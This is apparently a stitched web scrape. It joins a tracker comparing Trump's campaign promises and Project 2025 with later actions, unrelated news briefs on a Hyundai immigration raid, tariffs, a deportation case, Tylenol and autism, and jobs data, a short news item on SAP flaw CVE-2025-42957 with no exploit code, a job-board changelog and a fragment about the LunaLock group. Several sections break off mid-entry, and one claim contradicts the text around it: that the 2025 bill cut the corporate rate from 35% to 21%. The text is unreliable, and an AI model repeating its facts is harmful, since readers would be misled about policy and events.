	His budget proposal to the Department of Housing and Urban Development (HUD) in early May aims to cut rental aid by 40%, rerouting the funds for states to ""design their own rental assistance programs based on their unique needs and preferences.""
	Trump signed an executive order on his first day in office, ordering “emergency price relief” to lower housing costs and increase availability. Few follow-up actions have been taken. 
	No actions on “Freedom Cities” have been taken.
	In March, US home sales fell to their slowest rate since 2009.

Federal Budget

Economy & Taxes

During his campaign: Trump vowed to reduce government expenditures by eliminating entire agencies (notably the Department of Education), slashing federal regulations, ending spending on diversity, equity, and inclusion (DEI) initiatives, and cutting what he called “fraudulent spending.”

What Project 2025 said: Proposes ""major spending cuts in federal funding for labor programs,” and recommends “cut[ting] the Labor Department budget by 22%, the HHS budget by 6%, and the Education Department by 14%.""

Since election day: 


	The State Department laid off over 1,300 staffers in July.
	Republicans are working to broadly cut taxes and federal spending. Federal spending has reportedly increased, despite government cuts. 
	The White House released its fiscal 2026 budget proposal in early May, indicating $163 billion in cuts to most federal programs, including the Labor, Education, and Health and Human Services departments. It proposed increased funding to the Defense, Homeland Security, and Transportation departments.
	The Department of Government Efficiency (DOGE) claims to have cut $160 billion in federal spending since Trump took office. Some sources question that number.
	Allocations of the federal budget have been in flux since Trump’s first day in office. Most recently, the Justice Department reportedly cut $811 million in federal grants.

Capital Gains

Economy & Taxes

During his campaign: President Donald Trump expressed intentions to reduce the tax rate on capital gains to 15% if elected. The Tax Cuts and Jobs Act (TCJA) of 2017, passed under Trump’s first administration, meant long-term capital gains and qualified dividends rate brackets were tied to ordinary-income rate brackets. It will expire in 2025.

What Project 2025 said: ""Capital gains and qualified dividends would be indexed for inflation and taxed at 15%.""

Since election day: Trump said in July that he is considering ending capital gains taxes on home sales, but no significant changes have been made.

Corporate Taxes

Economy & Taxes

During his campaign: Trump said he would decrease the corporate tax rate to 20% if elected.

What Project 2025 said: “The corporate tax rate would be reduced from 21% to 18%. Capital expenditures would be written off in the first year.""

Since election day: Trump was reportedly considering a proposal that would raise the corporate tax rate to offset other tax cuts. In late April, he proposed corporate tax cuts within his ""big, beautiful bill,"" with a deadline of July 4th. The bill passed on July 4th, reducing the corporate tax rate from 35% to 21%. Read more about how the bill will impact your taxes.

Income Taxes

Economy & Taxes

During his campaign: President Donald Trump stated that he would eliminate federal taxes on tips for service workers if elected. He also proposed an end to taxes on overtime.

What Project 2025 said: 


	“The Treasury should work with Congress to simplify the tax code by enacting a simple two-rate individual tax system of 15 percent and 30 percent that eliminates most deductions, credits and exclusions.”
	Calls for eventually ""eliminating individual and corporate income taxes in favor of a consumption tax.""


Since election day:


	Trump reiterated his pledge to implement “no tax on tips” in January. In May, the Senate passed a bill that would grant a federal tax deduction of up to $25,000 a year on cash tips, but it would not eliminate taxes on tips.
	His “big, beautiful bill” is set to increase the state and local tax (SALT) deductions for families making less than $400,000 per year. The bill in total proposes about $3.7 trillion in tax cuts. Read more about how the bill will impact your taxes.
	Trump said in late April, ""I think the tariffs will be enough to cut all of the income tax.""
	He has floated the idea of broad income tax cuts to offset the impact of tariffs.
	The House passed a spending bill in February that, if passed by the Senate, will end taxes on overtime.

Since election day:


	Trump's ""big, beautiful bill"" is set to:

		
			extend the TCJA
			expand the low-income housing tax credit and increase tax breaks through the raised State and Local Tax (SALT) deduction

Electric Vehicles

Energy & Environment

During his campaign: In 2024, Trump said, “We want people to buy electric cars. But you know what? They have to be able to - if they want gasoline-powered, if they want hybrids - they got to have that. So we’re going to be ending that. We’re going to be ending a lot of the environmental things that were ridiculous, that hurt our country very badly and didn’t do anything for the environment. So we’ll be doing, you know, standard things.”

What Project 2025 said: Calls to rebuke ""the electric vehicle mandate,” with the stated goal to “preserve our automotive industry and uphold a commitment to our dedicated American auto workers. In simpler terms, you will have the freedom to purchase the vehicle of your preference.""

Since election day: 


	Trump's ""One, Big, Beautiful Bill Act"" is set to end tax credits for electric vehicles (EVs) after Sept. 30; however, the Internal Revenue Service (IRS) reportedly began providing some leeway for potential EV users.
	A federal judge ordered Trump to reinstate 14 states' electric vehicle infrastructure funding in late June, after his administration froze about $2.75 billion.
	The US Senate blocked California's EV mandate in May, prompting a state-led lawsuit.
	The White House’s budget proposed $15 billion in funding cuts for renewable energy technology and $5.7 billion in funding cuts for electric vehicle grants. 
	On his first day in office, Trump signed an executive order (“Unleashing American Energy”) eliminating the Biden administration’s non-binding target that 50% of new vehicles sold by 2030 be electric.
	Trump’s administration has paused federal funding for EV charging infrastructure and signaled intentions to eliminate or reduce federal tax credits for EV purchases and production. Fully removing them requires an act of Congress.

Drilling, Fracking, Pollution & Carbon Emissions

Energy & Environment

During his campaign: 


	Trump used the slogan “drill, baby, drill,” promising to end what he called the “war on American energy” and rapidly increase domestic oil and gas production, including both drilling and fracking.
	Trump pledged to increase drilling and fracking on federal lands, streamline permitting processes, and reduce regulatory hurdles that he argued were holding back energy production. 
	He specifically promised to reverse restrictions imposed during the Biden administration and open up more federal lands and offshore areas for exploration and extraction.


What Project 2025 said:  ""The new Administration must immediately roll back Biden’s orders, reinstate the Trump-era Energy Dominance Agenda, rescind Secretarial Order (SO) 3398, and review all regulations, orders, guidance documents, policies, and similar agency actions made in compliance with that order.""

	Trump's ""big, beautiful bill"" outlined plans to enhance leasing of public lands for drilling, logging and mining.
	On his first day back in office, Trump signed an executive order to begin the process of again withdrawing the U.S. from the Paris Agreement.
	Trump has signed multiple executive orders to dismantle Biden-era climate rules, including:
		
			Pausing or rescinding EPA greenhouse gas and methane emissions standards for power plants and oil/gas operations.
			Directing agencies to halt enforcement of stricter vehicle emissions standards and to review regulations that support clean energy or restrict fossil fuels.
			Expanding drilling, mining, and timber production on federal lands.
		
	
	Trump has similarly pushed states to remove these kinds of rules.
	Offshore oil drilling is set to increase in the Gulf of America by 100,000 barrels per day, after Trump signed a series of energy-related executive orders in January. Drilling efficiency should boost output by about 10%, according to Interior Secretary Doug Burgum.

Abortion

Society

During his campaign: 


	Pointing to his Supreme Court nominees from 2016, President Donald Trump took credit for overturning Roe v. Wade. He repeatedly referenced this during his 2024 campaign.
	After leaving the White House, Trump said he would work with Democrats and Republicans to compromise on the number of weeks into pregnancies that abortion should be legal and determine whether policies on abortion should be passed by states or the federal government.
	He criticized a bill that Gov. Ron DeSantis (FL-R) signed into law that banned abortion after six weeks of pregnancy, stating, “I think what he did is a terrible thing and a terrible mistake.” 
	Trump said he thinks it is likely better to allow states to pass abortion policies than to pass federal policy but said, “I can live with it either way. … It could be state or it could be federal. I don’t frankly care.” 
	In April 2024, Trump said overturning Roe v. Wade “wasn't about abortion so much as bringing it back to the states” 
	When a reporter asked Trump if he would sign a federal bill banning abortion after 15 weeks, Trump said: “I don't think there would be any reason for it because all the states are going to have their own [bills].” Trump said he has “never, and will never advocate imposing restrictions on birth control, or other contraceptives” in a post on Truth Social.
	Trump has also expressed support for exceptions to abortion bans in cases of rape, incest, and when the mother’s life is at risk.


What Project 2025 said:


	The plan calls for “reviv[ing] a 19th century law, the Comstock Act, to ban any abortion medications and materials preventing materials from being sent through the U.S. Postal Service”.
	It urges the FDA to “reverse its approval of mifepristone,” the first pill in the most common medication abortion regimen.
	It states that “conservatives at both the state and federal levels, including in the next conservative administration, should strive vigorously to protect the unborn in every jurisdiction across America”


Since election day:

	The Trump administration revoked a Biden-era policy in June that directed doctors to perform ""emergency abortions.""
	The administration is reportedly supporting the Food and Drug Administration (FDA) in its opposition to some restrictions on the abortion pill mifepristone. It argues that legislation should be up to states individually.
	On Trump’s first day in office, reproductiverights.gov became inactive. That week, Trump pardoned 23 pro-life advocates who were arrested by Biden’s Justice Department for violating the Freedom of Access to Clinic Entrances (FACE) Act. 
	Trump signed an executive order enforcing the Hyde Amendment, which prohibits the use of federal taxpayer dollars for elective abortions, with the exceptions of rape, incest and threats to mothers' lives.
	Trump sent out a video to participants of the annual March for Life in January, saying, “In my second term, we will again stand proudly for families and for life.” 
	Trump reportedly considered a $5,000 “baby bonus” for women, amidst a birth rate decline in the US. In June, he announced an investment of $1,000 in every American newborn.

Social Security

Society

During his campaign: Trump said in a Feb. 2024 interview with Fox News (Right bias), ""Social Security will remain intact, except in cases of fraud or similar issues.

Ukraine War

Foreign Policy

During his campaign: President Donald Trump said multiple times he could quickly end the war if elected. He called for a ceasefire and decreased involvement in the war to focus on domestic issues. While meeting with Hungarian Prime Minister Viktor Orbán, he allegedly stated he would “not give a single penny” for the war. 

What Project 2025 said:


	“With respect to Ukraine, continued U.S. involvement must be fully paid for; limited to military aid (while European allies address Ukraine’s economic needs); and have a clearly defined national security strategy that does not risk American lives.”
	“Regardless of viewpoints, all sides agree that Putin’s invasion of Ukraine is unjust and that the Ukrainian people have a right to defend their homeland. The conflict has severely weakened Putin’s military strength and provided a boost to NATO unity and its importance to European nations.”

	Putin reportedly proposed a deal to President Donald Trump in early August that would end the Russia-Ukraine War if reached. Zelenskyy rejected the deal the next day.
	In July, Trump threatened Russia with tariffs of 100% if a Russia-Ukraine peace agreement is not reached within 50 days. The Russian government called the threat “unacceptable” and escalated attacks on Ukraine. Later that month, Trump shortened the deadline to 10-12 remaining days.
	Trump announced in early July that the US will resume weapons shipments to Ukraine, after some shipments were halted a week earlier. He later announced a plan for NATO allies to purchase US weapons to send to Ukraine.
	Zelenskyy met with Trump during the NATO summit in late June. Trump asserted that NATO's agreement to increase defense spending ""will help prevent future disasters like the horrible situation with Russia and Ukraine.""

Israel-Hamas War

Foreign Policy

During his campaign: 


	President Donald Trump initially criticized Israeli leaders for purported intelligence failures after Hamas’ attack on Oct. 7, 2023, but pledged to “fully support” Israel.

	The UN opposed Israel’s plan to take over Gaza City and said it “must be immediately halted” in early August.
	Trump announced aid plans for Gaza in late July, saying, “We have to help on a humanitarian basis before we do anything. We have to get the kids fed.”
	He announced in early July that Israel agreed to a 60-day ceasefire, and he urged Hamas to do the same.
	US involvement in Israel's strikes on Iran in June is unknown to the public, since Trump made unclear statements. 
	Trump announced on May 30, ""They’re very close to an agreement on Gaza... We’ll let you know about it during the day or maybe tomorrow."" No agreement was reportedly made. 
	Israeli-American hostage Edan Alexander was released from Hamas in May. Trump referred to the release as ""great news.""
	Trump suggested the U.S. would clean up and redevelop Gaza, which he described as a “hellhole,” after Palestinians are resettled elsewhere. He said the U.S. could turn Gaza into the “Riviera of the Middle East,” where the “world’s people,” including Palestinians, would live.
	Trump has said Palestinians may not have the right to return to Gaza, while expressing humanitarian concerns about those who live there currently.
	Trump most recently opposed Israel’s proposed strikes on Iran.

	NATO’s 32 member countries agreed in late June to increase their defense spending targets from 2% of each member’s gross domestic product (GDP) to 5% within the next decade, after encouragement from Trump. The allies have reportedly since met the target.
	Trump's ""big, beautiful bill"" is set to allot funds to hire an additional 3,000 border patrol officers. It would also use $50 billion to increase security across the US-Mexico border with fencing, impose a fee on asylum-seekers, and allot $25 billion for Trump’s ""Golden Dome for America."" 
		
			Trump announced plans in May for the “Golden Dome” missile defense shield, which he predicted would cost $175 billion.
		
	
	Trump said the US could see an annual defense budget of over $1 trillion. “We have to build our military, and we’re very cost conscious, but the military is something that we have to build, and we have to be strong, because you got a lot of bad forces out there now,” he said.
	Defense Secretary Pete Hegseth cut $5.1 billion in “wasteful Defense Department contracts” in April, and has called for cuts of up to 8% in the Pentagon budget for each of the next five years.

China

Foreign Policy

During his campaign: Trump confirmed that he would impose tariffs of at least 60% on Chinese goods if re-elected, potentially mirroring his first term when he imposed $250B in tariffs. He opposed a TikTok ban that was considered in Congress for national security reasons, arguing that it would help Meta instead.

Student Debt

Education

During his campaign: Trump didn’t have a clear policy plan for student loan debt, though he criticized the previous administration’s attempts at widespread debt cancellation.

What Project 2025 said: “The new administration must end the practice of acting like the federal student loan portfolio is a campaign fund to curry political support and votes. The new administration must end abuses in the loan forgiveness programs. Borrowers should be expected to repay their loans.”

	The Education Department's Civil Rights Office said in late June that California violated Title IX by allowing non-biological women to compete in women's sports.
	The department launched a probe into some Connecticut public schools for potentially allowing transgender students to use facilities aligning with their chosen gender identities, in late May. 
	The Trump administration ordered schools to adhere to certain standards, such as the termination of DEI programs. A judge blocked the move in April.
	Trump signed an executive order in February, banning transgender women from competing in women’s sports “to protect opportunities for women and girls to compete in safe and fair sports.”

Federal Funding

Education

During his campaign: President Donald Trump called to cut the federal funding of schools and school programs that push “critical race theory, gender ideology, or other inappropriate racial, sexual, or political content onto our children.” He also promised to expand school choice.

What Project 2025 said: The plan calls for the government's role in education to be ""that of a statistics-gathering agency that disseminates information to the states.""

Since election day: 


	US District Judge Stephanie Gallagher, whom Trump appointed, blocked the Trump administration’s funding cuts to schools that use diversity, equity and inclusion (DEI) programs, due to free speech criticisms.

	American Academy has not been established.

Religion

Society

During his campaign: 


	Trump said religion was “under threat” in the US, and said Christian leaders would have “direct access” to him.
	Trump promised to permanently repeal the Johnson Amendment, which prohibits churches from endorsing candidates for public office.
	Trump received criticism for selling “God Bless the USA” Bibles in March 2024, stating, “This Bible is a reminder that the biggest thing we have to bring back America and to make America great again is our religion. Religion is so important. It's so missing. But it’s going to come back and it's going to come back strong just like our country is going to come back strong.” 


What Project 2025 said: 


	“Secure our God-given individual rights to live freely.”
	“God ordained the Sabbath as a day of rest,” referring exclusively to Sunday, as opposed to the days of rest held by other religions.
	The federal government should “maintain a biblically based, social science-reinforced definition of marriage and family.”


Since election day: 


	A federal judge blocked religious exemptions from an Obamacare birth control mandate that were established by the Trump administration, in August.
	The Internal Revenue Service (IRS) granted houses of worship approval in July to endorse political candidates without endangering their tax-exempt status.
	Trump suggested Pope Leo XIV could host peace negotiations between Russia and Ukraine at the Vatican, in May.
	He established a task force to “eradicate anti-Christian bias” and has hosted White House events with faith leaders. In early May, the Justice Department launched an investigation into Washington State Senate Bill 5375, which requires clergy to break their spiritual seal of confidentiality during Confession to report instances of child abuse. The department's press release refers to the bill as ""anti-Catholic.""
	Trump said, during his National Day of Prayer speech on May 1, ""This is a religious ceremony, but that's part of the religion; because if your taxes go up 68 percent, you might give up your religion. You might have no choice. You'll be working too hard to make it."" That same day, he established the Religious Liberty Commission via an executive order.
	By executive order, Trump established the “White House Faith Office.”
	On Easter Monday, Trump declared he was “bringing religion back to America.”
	The Johnson Amendment remains in place.

Gun Ownership

Gun Control

During his campaign: 


	In the past, he has expressed openness to strengthening background checks. 
	Trump also said he would reverse all gun control measures that the Biden administration passed and fire the director of the Bureau of Alcohol, Tobacco, Firearms and Explosives, if elected. 
	He told NRA supporters, “No president has fought harder to protect your Second Amendment rights” and said, “No one will lay a finger on your firearms if I win the election.”
	However, he also said he would call on local law enforcement to “strictly enforc[e] existing gun laws against convicted felons.”


What Project 2025 said: Project 2025 opposes weapons bans, universal background checks, red flag laws, and enhanced storage guidelines.

Since election day:


	The White House released a statement after the Minneapolis school shooting in late August. It called the shooting a “senseless [act] of violence” but did not directly address gun violence culture or policies.
	The Justice Department reportedly asked the Supreme Court in August to overturn an appeals court’s decision that loosens gun control measures for pot smokers and other former drug users.
	The Trump administration reportedly proposed a pathway to gun ownership for some individuals with criminal histories in July if they are not deemed a threat to public safety. The case-by-case pathway would not apply to violent felons or registered sex offenders.
	Trump's ""big, beautiful bill"" is set to eliminate the transfer tax on suppressors, enacted under the National Firearms Act of 1934.
	In February 2025, Trump signed an executive order directing Attorney General Pam Bondi to review and propose plans to undo a wide range of gun safety measures enacted under President Biden. The order targets:
		
			Regulations on “ghost guns” (untraceable firearms assembled from kits)
			Expanded background checks, including those closing the “gun show loophole”
			The ATF’s “zero tolerance” policy, which had led to the revocation of licenses for gun dealers with serious regulatory violations
			Any other executive actions or agency rules from the Biden administration that may have restricted gun rights
		
	
	As a result of the executive order, Bondi announced in April 2025 the reversal of the ATF’s “zero tolerance” enforcement policy. This move makes it harder to revoke the licenses of gun dealers who break the law, a change welcomed by gun rights groups and criticized by gun safety advocates.
	Trump established a “Second Amendment Enforcement Task Force” within the Department of Justice to develop and execute strategies for advancing and protecting gun rights.

Weapons Ban

Gun Control

During his campaign: President Donald Trump signaled support for stricter background checks after mass shootings in El Paso, Texas and Dayton, Ohio but did not call on Congress to pass background check legislation. 

What Project 2025 said: Calls for eliminating federal and state bans on assault weapons, weakening restrictions on carrying firearms in public, passing national concealed carry reciprocity, and weakening federal oversight of the gun industry.

Since election day: 


	The Trump administration reportedly proposed a pathway to gun ownership for some individuals with criminal histories in July if they are not deemed a threat to public safety. The case-by-case pathway would not apply to violent felons or registered sex offenders.
	The Justice Department (DOJ) lifted the ban on forced-reset triggers, allowing sales to resume, in May. The move prompted multiple state lawsuits.
	After a Florida State University shooting in April left two dead, Trump said, “I have an obligation to protect the Second Amendment. I ran on the Second Amendment, among many other things, and I will always protect the Second Amendment.” He took the stance that “the gun doesn't do the shooting, the people do.”

Armed Personnel in Schools

Gun Control

During his campaign: 


	President Donald Trump suggested arming school teachers as a response to shootings, giving them extra pay as an incentive, and he clarified that teachers would require special training in order to be armed. He said, “I don’t want teachers to have guns, I want certain highly adept people, people that understand weaponry, guns — if they really have that aptitude.” 
	Trump also suggested that buildings should have a single point of entry, stronger fencing, and metal detectors, and he pledged in his 2016 campaign to end gun-free zones in schools.


What Project 2025 said: The plan encourages states to redirect education funding to arm teachers and provide bonuses to those who carry weapons.

Since election day: No legislative action has been taken on school security.

Policing

Criminal Justice

During his campaign: Trump pledged a “record investment in hiring, retention and training” for law enforcement.

What Project 2025 said: Project 2025 proposes federal intervention against local officials who decline to prosecute low-level offenses or who support non-cash bail systems, and it encourages the Department of Justice to take legal action against such policies.

Since election day: 


	Immigration and Customs Enforcement (ICE) is reportedly set to expand policing and deportations in New York, Seattle, Portland, Chicago, and Los Angeles.
	Trump federalized Washington, D.C., in August in an effort to “stop violent crime.”
	The White House announced in early August that federal law enforcement will be directed to Washington, D.C., in an effort to lower the violent crime rate.
	The FBI launched a criminal investigation in July of former CIA Director John Brennan and former FBI Director James Comey for potential misconduct related to the 2016 Trump-Russia probe.
	Trump deployed thousands of military troops to Los Angeles, Calif. in June, in an effort to crack down on anti-ICE protests.
	The Trump administration announced, in May, that it would be rolling back Biden-era police reform in some cities that have exhibited police-caused killings and brutality.
	Trump has signed several executive orders related to law enforcement, including:
		
			STRENGTHENING AND UNLEASHING AMERICA’S LAW ENFORCEMENT TO PURSUE CRIMINALS AND PROTECT INNOCENT CITIZENS
			Executive Order on Restoring the Death Penalty and Protecting Public Safety

Crime

Criminal Justice

During his campaign: Trump vowed to restore ""law and order"" amid what he framed as a crisis of crime in America.

What Project 2025 said: It frames crime as a major national crisis and calls for “restoring law and order” by increasing federal law enforcement presence and expanding mandatory minimum sentences.

Since election day:


	Trump signed a series of executive orders in late August in a supposed effort to crack down on crime.
	The FBI arrested a woman on its “Ten Most Wanted Fugitives List” in August.
	Trump announced plans in August to deploy National Guard troops – and possibly FBI agents – to Washington, D.C., in an effort to “stop violent crime.”
	Trump expressed plans in July to reopen the infamous Alcatraz prison in California.
	According to the Real-Time Crime Index (RTCI), violent crime dropped 14% and property crime fell 16% in the first three months of 2025 compared to the same period in 2024, with murder rates in major cities down 21–23%.
	The administration has expanded the use of the death penalty and intensified federal prosecutions.
	Trump’s Justice Department has initiated civil rights investigations into “radical left” prosecutors and pressured local jurisdictions to adopt his preferred policing methods, such as stop-and-frisk.

Human Trafficking

Criminal Justice

During his campaign: 


	In 2020, Trump detailed his plan to combat human trafficking.
	“When I'm back in the White House, ... I will urge Congress to ensure that anyone caught trafficking children across our border receives the death penalty... immediately,” Trump said in 2023.
	Trump said he’d use Title 42 to “end the child trafficking crisis by returning all trafficked children to their families in their home countries, without delay.”


Since election day: 


	The US State Department cut half of the Office to Monitor and Combat Trafficking in Persons’ (TIP) full-time employees in July. The cuts came amidst ongoing skepticism of Trump’s involvement with Jeffrey Epstein, the infamous deceased sex trafficker.
	Rep. Maxwell Frost (D-FL) accused the Trump administration of ""human trafficking,"" after the Supreme Court allowed migrants to be deported to ""third countries"" in late June.
	The Justice Department’s cuts to federal grants in April include cuts to police training on how to investigate disabled victims of human trafficking.

Capital Punishment

Criminal Justice

During his campaign: President Donald Trump supported the death penalty on a federal level; 13 criminals were executed under his first presidency by the federal government. He also expressed interest in instituting the death penalty for drug traffickers.

What Project 2025 said: Calls for the next Administration to execute every person who is currently sitting on federal death row.

Since election day:

Whistleblowers

Criminal Justice

During his campaign: President Donald Trump said he was considering a pardon for Edward Snowden in 2020, though he implied he should be executed in 2013. In a 2021 post-presidency interview with Candace Owens, Trump defended his decision to not pardon Snowden or Julian Assange because there were “good people on both sides… and you have some bad people on one side.” He reportedly decided to “let the courts work it out.” 

Since election day: No legislative action on whistleblowers has been taken.

Cash Bail

Criminal Justice

During his campaign: President Donald Trump did not support the abolition of cash bail. After New York had reformed its bail system, he said the state was letting out “hardened and bad” criminals.

What Project 2025 said: Calls to reverse bail reform and supports restoring or expanding the use of cash bail. The plan criticizes local prosecutors and jurisdictions that have eliminated or restricted cash bail, arguing these policies are “soft on crime” and undermine public safety.

Since election day: No legislative action on cash bail has been passed; however, a Trump executive order from late August reportedly aims to eliminate cashless bail.

The Details: South Korea and the U.S. are discussing details on ""allowing the detained workers to return on a voluntary basis."" South Korean Foreign Minister Cho Hyun is expected to travel to the U.S. on Monday afternoon for talks related to the release of the workers. Once the administrative procedures are completed, South Korea will send a charter plane to bring the detainees home.

Key Quote: ""I am hereby calling on all Foreign Companies investing in the United States to please respect our Nation's Immigration Laws,"" Trump said in a social media post on Sunday.

For Context: The South Koreans were arrested at a Hyundai factory on September 5th following a multi-month investigation where agents reportedly encountered “hundreds” of unauthorized immigrants working at the facility. Hyundai claimed none of the workers at the electric vehicle plant were directly employed by the company, though it owns the plant. Georgia Governor Brian Kemp (R) has touted the factory, which employs 1,200 people, as the ""biggest economic development project in the state's history.""

How the Media Covered It: Sources across the political spectrum noted that workplace raids have become common as part of the Trump administration's mass deportation agenda. It was also widely reported that this particular raid came as a surprise to South Korea because it is a key U.S. ally. The country agreed in July to make a $350 billion investment in the U.S. and purchase $100 billion in U.S. energy in return for the U.S. lowering tariff rates.

The Details: The UN’s Universal Postal Union (UPU) reported that the sharp decline began on August 29 and is now developing a technical solution to help international postal operators collect the required duties. Air carriers did not want to be responsible for collecting them, and 88 postal operators have suspended some or all shipments to the US, according to the UPU. On September 5, the agency launched a calculator to help shippers determine the required duties.

For Context: The Trump administration already ended the exemption for China on April 2, causing disruption for Chinese discount retailers like Shein and Temu. On August 7, new Trump administration tariffs took effect on over 90 countries. On August 27, the administration doubled tariffs on India to 50% due to the country’s continued purchasing of Russian oil.

The Details: A Department of Homeland Security official informed Abrego’s lawyers Friday that Eswatini, formerly known as Swaziland, will replace Uganda as the designated country for his removal. The decision followed Abrego’s claims that he feared persecution in Uganda. Abrego, 30, has no ties to Eswatini and is being held in a Virginia detention center.

His case has drawn attention since March, when U.S. authorities accused him of gang involvement and deported him to El Salvador despite a judge’s order blocking removal. He was later returned to the U.S. to face criminal charges of transporting migrants illegally, which he denies.

For Context: Abrego, a sheet metal worker, had been living in Maryland with his wife and children, all U.S. citizens. His lawyers argue that the administration is pressuring him to plead guilty, citing past offers to send him to Costa Rica if he accepted a deal or to Uganda if he did not. A previous DHS statement linked deportation flights to Eswatini with individuals described as “uniquely barbaric” who were rejected by their home countries.

How the Media Covered It: CNN (Lean Left bias) highlighted the administration’s shifting deportation plans, noting Abrego’s attempt to seek asylum and preference for Costa Rica. The New York Post (Lean Right) framed him as an “accused MS-13 gangbanger,” emphasizing his alleged criminal ties. Reuters (Center) focused on the legal twists in his case, including accusations of vindictive prosecution.

Kennedy Jr. is expected to release a report on autism this month. According to The Wall Street Journal (Center bias), the report will announce a possible link between autism and over-the-counter pain medication. 

The Details: The Journal wrote the report ""is likely to suggest as among the potential causes of autism low levels of folate, an important vitamin, and Tylenol taken during pregnancy, people familiar with the matter said."" Tylenol is a widely used pain reliever that contains acetaminophen. Kenvue, the maker of Tylenol, shares declined 11% following the report on Friday afternoon. 

For Context: Research from Mount Sinai and Harvard's School of Public Health released in August found the strongest evidence yet that acetaminophen could be linked to autism and ADHD and advised expectant mothers to use it sparingly. ""More than two dozen studies around the world have linked a pregnant person's frequent use of acetaminophen to autism and attention-deficit hyperactivity disorder in their child. But several studies have also found competing evidence. A 2024 study in Sweden of about 2 million children, over 180,000 of whom were exposed to acetaminophen during pregnancy, found no associations between the pain medication and children’s risk of autism, ADHD or intellectual disability."" USA Today (Lean Left) said. Around 3.2% of eight-year-olds in the US were affected by autism in 2022.

How The Media Covered It: The New York Times (Lean Left) said, ""the researchers who conducted the review cautioned that their conclusion did not mean acetaminophen caused autism, which mainstream scientists overwhelmingly agree is a result of a complex mix of genetic and environmental factors."" adding that conservatives are focusing on an ""unproven link.""

The Details: The raid follows a multi-month investigation where agents reportedly encountered “hundreds” of unauthorized immigrants working at the facility. Wall Street Journal (Center bias) reported over 300 of those arrested were South Korean nationals, according to a South Korean official. They are currently being held at a facility in Folkston, Georgia. Homeland Security Special Agent Steve Schrank said the operation was the “largest single-site enforcement operation” in homeland security history. The FBI, ICE, US Drug Enforcement Agency, and the Bureau of Alcohol, Tobacco, Firearms and Explosives were all involved in the raid. 

For Context: Hyundai Motor Group recently pledged $26 billion in US investments. It started producing electric vehicles at the Georgia facility in 2024, which employs roughly 1,200 workers. The Trump administration has continued to crackdown on unauthorized immigration. President Trump recently threatened to send National Guard troops and ICE agents to Chicago to support immigration operations. In August, ICE reported it had detained over 60,000 unauthorized immigrants.

How the Media Covered It: BBC (Center) wrote the raid could raise tension between President Trump’s top priorities to build up US manufacturing and cut down on illegal immigration. It also said it may “put stress” on the US’s relationship with South Korea. Just the News (Lean Right) quoted South Korea’s foreign ministry spokesperson, who said, “The economic activities of our companies investing in the U.S. and the rights and interests of our nationals must not be unfairly violated. We conveyed our concern and regret through the U.S. Embassy in Seoul today.” The New York Times (Lean Left) mentioned some injuries sustained by those arrested, and also said the operation “caused diplomatic harm” in South Korea.

The Details: The Labor Department reported that the economy added 22,000 jobs in August while the unemployment rate reached 4.3%. The report also revised June’s figures to show a loss of 13,000 jobs—the first monthly decline in employment since December 2020, ending what had been the nation’s second-longest stretch of job growth on record. July’s numbers were also revised to 79,000 from 73,000.

For Context: In August, President Trump fired the Bureau of Labor Statistics commissioner Erika McEntarfer after claiming the July jobs report was “rigged” in a Truth Social post. This comes amid an ongoing trade war and economic uncertainty, which have raised questions about companies’ willingness to hire.

How the Media Covered It: Outlets across the political spectrum pointed to economic uncertainty following Trump’s trade and immigration policies. The Hill (Center bias) and Fox Business (Lean Right) outlined employment rates in different sectors, including decreases in manufacturing, federal government, and coal and mining, and gains in healthcare, and social assistance jobs. CNN Business (Lean Left) wrote that wage growth has also slowed, and mentioned previous warnings the labor market was “losing steam.” Fox Business noted the report comes as the Federal Reserve weighs cutting interest rates.

A critical security vulnerability impacting SAP S/4HANA, an Enterprise Resource Planning (ERP) software, has come under active exploitation in the wild.
The command injection vulnerability, tracked as CVE-2025-42957 (CVSS score: 9.9), was fixed by SAP as part of its monthly updates last month.
""SAP S/4HANA allows an attacker with user privileges to exploit a vulnerability in the function module exposed via RFC,"" according to a description of the flaw in the NIST National Vulnerability Database (NVD). ""This flaw enables the injection of arbitrary ABAP code into the system, bypassing essential authorization checks.

Successful exploration of the defect could result in a full system compromise of the SAP environment, subverting the confidentiality, integrity, and availability of the system. In short, it can permit attackers to modify the SAP database, create superuser accounts with SAP_ALL privileges, download password hashes, and alter business processes.
SecurityBridge Threat Research Labs, in an alert issued Thursday, said it has observed active exploitation of the flaw, stating the issue impacts both on-premise and Private Cloud editions.
""Exploitation requires access only to a low-privileged user to fully compromise an SAP system,"" the company said. ""A complete system compromise with minimal effort required, where successful exploitation can easily lead to fraud, data theft, espionage, or the installation of ransomware.""
It also noted that while widespread exploitation has not yet been detected, threat actors possess the knowledge to use it, and that reverse engineering the patch to create an exploit is ""relatively easy.""
As a result, organizations are advised to apply the patches as soon as possible, monitor logs for suspicious RFC calls or new admin users, and ensure appropriate segmentation and backups are in place.
""Consider implementing SAP UCON to restrict RFC usage and review and restrict access to authorization object S_DMIS activity 02,"" it also said.
Update
Cybersecurity vendor Pathlock has also revealed it ""detected outlier activity consistent with exploitation attempts of CVE-2025-42957,"" warning ""any organization that has not yet applied SAP’s August 2025 security notes is at risk.""

Added filter by minimum salary + company industry

Changelog - v0.9.20
https://lnkd.in/enMb76Yt 👀

Our latest improvements allow you now to filter jobs and companies in the |Hiring| space by the industry the company is operating in.

Another new feature is filtering by minimum salary based in USD or EUR. What this means is that we do currency conversion in the background (~30 currencies) for all jobs with either given or estimated salaries and calculate their base values in EUR and USD for the date they where published.

This way you can choose a value between the two main currencies and search within all listings regardless of the original currency their job was posted or estimated in. It makes a great feature for comparing global salaries (yes, we'll share lots of insights on that one in the future - stay tuned!) and you're not restricted to only a particular currency when searching.

Another bonus with this is, thanks to all filters and settings in a Context being applied to all lists in the |Hiring| space, that you can immediately filter for companies that pay salaries above a certain threshold. Combined with some other filtering options available this makes a powerful and fast search experience across jobs and companies alike.

NOTE: Only job listings published over the past couple days have their estimates calculated and/or salary converted to EUR/USD, we're currently backfilling all values over the next days. Keep that in mind when you don't see any results yet for searches with a selected minimum salary ;)

Introduced salary estimates + broader topics

Changelog - v0.9.18
https://lnkd.in/enMb76Yt 👀

We've added a few more topics to choose from which now are separated into main topics and sub topics. If you where using topics for your Context and not getting enough results you might want to try some of the main topics for a broader and larger result set.

What's also new is that we introduced salary estimates on all job posts with enough matching data (based on vector embeddings). That can be quite helpful for listings that don't come with salaries provided, so this would give an estimated range of what similar positions on average (median) would pay. It's still experimental and can be way off sometimes, so its intended mostly as an informative guide and not an indicator of what a particular position actually pays.

Leveraging compromised credentials and social engineering, the group behind LunaLock has zeroed in on a niche marketplace—Artists & Clients—where freelance creators exchange custom commissions.



